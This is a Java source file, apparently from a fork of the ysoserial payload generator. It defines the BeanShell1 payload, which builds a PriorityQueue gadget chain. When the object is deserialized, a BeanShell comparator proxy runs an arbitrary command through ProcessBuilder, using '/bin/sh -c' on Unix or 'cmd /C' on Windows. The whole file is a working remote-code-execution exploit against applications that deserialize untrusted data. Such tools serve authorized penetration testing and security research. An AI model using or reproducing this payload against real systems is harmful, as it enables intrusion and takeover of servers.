package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.lang.StringUtils;

import bsh.Interpreter;
import bsh.XThis;

import ysoserial.payloads.util.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicCommands;
import ysoserial.payloads.util.Reflections;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
@DynamicCommands({DynamicCommands.EXEC_GLOBAL, DynamicCommands.EXEC_WIN, DynamicCommands.EXEC_UNIX})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command, String attackType) throws Exception {
	// BeanShell payload
    	
    	// federicodotta - Sleep and DNS not supported
    	   
    	// default ysoserial global exec
    	String payload =
            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join( // does not support spaces in quotes
                    Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                    ",", "\"", "\"") +
                "}).start();return new Integer(1);}";
    	// federicodotta - EXEC with args unix	
	    if(attackType.equals("exec_unix")) {
	    	 
	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",\"" + command + "\"}).start();return new Integer(1);}";	    	 

    	// federicodotta - EXEC with args win	    	
	    } else if(attackType.equals("exec_win")) {
	    	 
	    	payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"cmd\",\"/C\",\"" + command + "\"}).start();return new Integer(1);}";
			
	    } else if(attackType.equals("sleep") || attackType.equals("dns") || attackType.equals("java_reverse_shell")) {
	    	
	    	System.out.println("**********************************");
	    	System.out.println(attackType + " not supported. Defaulting to exec_global");
	    	System.out.println("**********************************");
	    	System.out.println();
	    	
	    }

	// Create Interpreter
	Interpreter i = new Interpreter();

	// Evaluate payload
	i.eval(payload);

	// Create InvocationHandler
	XThis xt = new XThis(i.getNameSpace(), i);
	InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

	// Create Comparator Proxy
	Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

	// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
	final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
	Object[] queue = new Object[] {1,1};
	Reflections.setFieldValue(priorityQueue, "queue", queue);
	Reflections.setFieldValue(priorityQueue, "size", 2);

	return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {
	PayloadRunner.run(BeanShell1.class, args);
    }
}
